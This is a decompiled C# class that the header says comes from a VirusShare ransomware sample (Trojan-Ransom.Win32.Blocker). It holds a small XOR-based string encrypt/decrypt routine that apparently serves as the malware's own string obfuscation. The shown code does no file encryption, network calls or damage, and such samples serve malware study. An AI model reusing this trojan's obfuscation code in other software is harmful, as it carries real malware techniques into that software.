// Decompiled with JetBrains decompiler
// Type: rundll32.encryption.sll
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;

namespace rundll32.encryption
{
  internal class sll
  {
    private static string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

    public static string decrypt(string input, string pass)
    {
      char[] chArray = new char[input.Length];
      for (int index = 0; index < input.Length; ++index)
      {
        string chars = sll.chars;
        string str = input[index].ToString();
        chArray[index] = !chars.Contains(str) ? input[index] : '0';
      }
      input = new string(chArray);
      pass += pass;
      string str1 = "";
      int index1 = 0;
      for (int index2 = 0; index2 < input.Length / 5; ++index2)
      {
        if (index1 == pass.Length - 1)
          index1 = 0;
        char ch1 = (char) int.Parse(input.Substring((index2 + 1) * 5 - 5, 5));
        char ch2 = pass[index1];
        str1 += (string) (object) (char) (((uint) ch1 ^ (uint) ch2) / (uint) ch2);
        ++index1;
      }
      return str1;
    }

    public static string encrypt(string input, string pass)
    {
      pass += pass;
      int index1 = 0;
      char[] chArray1 = new char[input.Length];
      for (int index2 = 0; index2 < input.Length; ++index2)
      {
        if (index1 == pass.Length - 1)
          index1 = 0;
        char ch1 = input[index2];
        char ch2 = pass[index1];
        char ch3 = (char) ((uint) ch1 * (uint) ch2 ^ (uint) ch2);
        chArray1[index2] = ch3;
        ++index1;
      }
      string str = "";
      foreach (int num in chArray1)
        str += string.Format("{0:00000}", (object) num);
      char[] chArray2 = new char[str.Length];
      Random random = new Random();
      for (int index3 = 0; index3 < str.Length; ++index3)
      {
        if (str[index3] == '0')
        {
          int index4 = random.Next(0, sll.chars.Length);
          chArray2[index3] = sll.chars[index4];
        }
        else
          chArray2[index3] = str[index3];
      }
      return new string(chArray2);
    }
  }
}
